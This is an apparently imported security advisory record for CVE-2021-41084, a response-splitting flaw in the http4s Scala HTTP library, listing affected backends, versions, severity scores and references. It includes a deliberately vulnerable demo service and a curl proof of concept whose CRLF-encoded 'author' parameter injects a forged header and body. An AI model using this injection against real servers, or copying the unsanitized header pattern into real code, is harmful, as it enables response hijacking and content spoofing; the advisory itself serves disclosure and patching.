advisory_id: maven/org.http4s/http4s-server_3/CVE-2021-41084
datasource_id: gitlab_importer_v2/maven/org.http4s/http4s-server_3/CVE-2021-41084
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/org.http4s/http4s-server_3/CVE-2021-41084.yml
aliases:
  - CVE-2021-41084
  - GHSA-5vcm-3xc3-w7x3
summary: |
  Response Splitting from unsanitized headers
  http4s is vulnerable to response-splitting or request-splitting attacks when untrusted user input is used to create any of the following fields:

  * Header names (`Header.name`å
  * Header values (`Header.value`)
  * Status reason phrases (`Status.reason`)
  * URI paths (`Uri.Path`)
  * URI authority registered names (`URI.RegName`) (through 0.21)

  The following backends render invalid carriage return, newline, or null characters in an unsafe fashion.

  |                | blaze-server | ember-server | blaze-client | ember-client | jetty-client |
  |:---------------|:-------------|:-------------|:-------------|--------------|--------------|
  | header names   | ⚠            | ⚠            | ⚠            | ⚠            |   ⚠            |
  | header values  | ⚠            | ⚠            | ⚠            | ⚠            |              |
  | status reasons | ⚠            | ⚠            |              |              |              |
  | URI paths      |              |              |  ⚠             |  ⚠             |              |
  | URI regnames   |              |              |  ⚠ < 0.22           |  ⚠ < 0.22            |              |

  For example, given the following service:

  ```scala
  import cats.effect._
  import org.http4s._
  import org.http4s.dsl.io._
  import org.http4s.server.blaze.BlazeServerBuilder
  import scala.concurrent.ExecutionContext.global

  object ResponseSplit extends IOApp {
  override def run(args: List[String]): IO[ExitCode] =
  BlazeServerBuilder[IO](global)
  .bindHttp(8080)
  .withHttpApp(httpApp)
  .resource
  .use(_ => IO.never)

  val httpApp: HttpApp[IO] =
  HttpApp[IO] { req =>
  req.params.get("author") match {
  case Some(author) =>
  Ok("The real content")
  .map(_.putHeaders(Header("Set-Cookie", s"author=${author}")))
  case None =>
  BadRequest("No author parameter")
  }
  }
  }
  ```

  A clean `author` parameter returns a clean response:

  ```sh
  curl -i 'http://localhost:8080/?author=Ross'
  ```

  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain; charset=UTF-8
  Set-Cookie: author=Ross
  Date: Mon, 20 Sep 2021 04:12:10 GMT
  Content-Length: 16

  The real content
  ```

  A malicious `author` parameter allows a user-agent to hijack the response from our server and return different content:

  ```sh
  curl -i 'http://localhost:8080/?author=hax0r%0d%0aContent-Length:+13%0d%0a%0aI+hacked+you'
  ```

  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain; charset=UTF-8
  Set-Cookie: author=hax0r
  Content-Length: 13

  I hacked you
  ```
impacted_packages:
  - purl: pkg:maven/org.http4s/http4s-server_3
    affected_versions: vers:maven/>=0.22.0|<0.22.5|>=0.23.0|<0.23.4
    fixed_versions: vers:maven/0.22.5|0.23.4
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv2
    scoring_elements: AV:N/AC:M/Au:N/C:N/I:P/A:N
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/org.http4s/http4s-server_3/CVE-2021-41084.yml
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/org.http4s/http4s-server_3/CVE-2021-41084.yml
weaknesses:
  - CWE-937
  - CWE-1035
  - CWE-918
  - CWE-74
references:
  - url: https://github.com/http4s/http4s
    reference_type:
    reference_id:
  - url: https://github.com/http4s/http4s/commit/d02007db1da4f8f3df2dbf11f1db9ac7afc3f9d8
    reference_type:
    reference_id:
  - url: https://github.com/http4s/http4s/security/advisories/GHSA-5vcm-3xc3-w7x3
    reference_type:
    reference_id:
  - url: https://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.html#fields.values
    reference_type:
    reference_id:
  - url: https://owasp.org/www-community/attacks/HTTP_Response_Splitting
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-41084
    reference_type:
    reference_id: CVE-2021-41084
  - url: https://github.com/advisories/GHSA-5vcm-3xc3-w7x3
    reference_type:
    reference_id: GHSA-5vcm-3xc3-w7x3
